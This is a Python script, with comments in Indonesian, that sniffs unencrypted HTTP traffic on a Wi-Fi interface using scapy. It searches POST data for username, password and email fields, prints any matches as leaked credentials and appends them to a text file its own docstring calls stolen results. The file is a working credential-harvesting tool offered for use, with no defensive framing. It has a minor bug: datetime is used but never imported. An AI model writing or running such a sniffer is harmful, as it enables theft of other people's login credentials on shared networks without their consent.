import scapy.all as scapy
from scapy.layers import http
from colorama import init, Fore, Style

init(autoreset=True)

def dapatkan_url(paket):
    """
    Fungsi untuk mengekstrak URL website yang sedang dikunjungi.
    Menggabungkan Host (misal: google.com) + Path (misal: /search?q=halo).
    """
    try:
        host = paket[http.HTTPRequest].Host.decode()
        path = paket[http.HTTPRequest].Path.decode()
        return host + path
    except Exception:
        return "URL Tidak Terbaca"

def dapatkan_info_login(paket):
    """
    Fungsi untuk mencari username/password di dalam data mentah (Raw Layer).
    Biasanya dikirim via metode POST.
    """
    if paket.haslayer(scapy.Raw):
        try:
            data_mentah = paket[scapy.Raw].load.decode(errors="ignore")
            
            kata_kunci = ["username", "user", "login", "password", "pass", "email", "uname", "sandi"]
            
            for kata in kata_kunci:
                if kata in data_mentah:
                    return data_mentah
        except Exception:
            pass
            
    return None

def catat_log(url, data):
    """Fungsi untuk menyimpan hasil curian ke file teks."""
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{waktu}] URL: {url} | DATA: {data}\n"
    
    with open("hasil_tangkapan.txt", "a") as f:
        f.write(log_entry)
    print(Fore.YELLOW + f"[Disk] Data berhasil disimpan ke 'hasil_tangkapan.txt'")

def proses_paket(paket):
    if paket.haslayer(http.HTTPRequest):
        url = dapatkan_url(paket)

        info_login = dapatkan_info_login(paket)
        
        if info_login:
            print(Fore.RED + Style.BRIGHT + "\n" + "="*60)
            print(Fore.RED + Style.BRIGHT + "[*] BAHAYA: KREDENSIAL DITEMUKAN!")
            print(Fore.YELLOW + f"    Target URL : {url}")
            print(Fore.GREEN +  f"    Data Bocor : {info_login}")
            print(Fore.RED + Style.BRIGHT + "="*60 + "\n")
            
            catat_log(url, info_login)

def mulai_mengintai(interface):
    print(Fore.CYAN + f"[*] Menjalankan 'Jaring Pengintai' pada interface: {interface}")
    print(Fore.CYAN + "[*] Menunggu lalu lintas data HTTP (Unencrypted)...")
    print(Fore.CYAN + "[*] Tekan Ctrl+C untuk berhenti.\n")
    
    scapy.sniff(iface=interface, store=False, prn=proses_paket)

if __name__ == "__main__":
    # GANTI 'en0' DENGAN INTERFACE WIFI ANDA!
    # Cek di Terminal: ifconfig
    interface_wifi = "en0" 
    
    try:
        mulai_mengintai(interface_wifi)
    except KeyboardInterrupt:
        print("\n[!] Program dihentikan pengguna.")
    except PermissionError:
        print(Fore.RED + "[!] ERROR: Izin Ditolak.")
        print(Fore.RED + "    Anda wajib menggunakan 'sudo' untuk melakukan sniffing.")
        print(Fore.RED + "    Contoh: sudo python3 pengintai.py")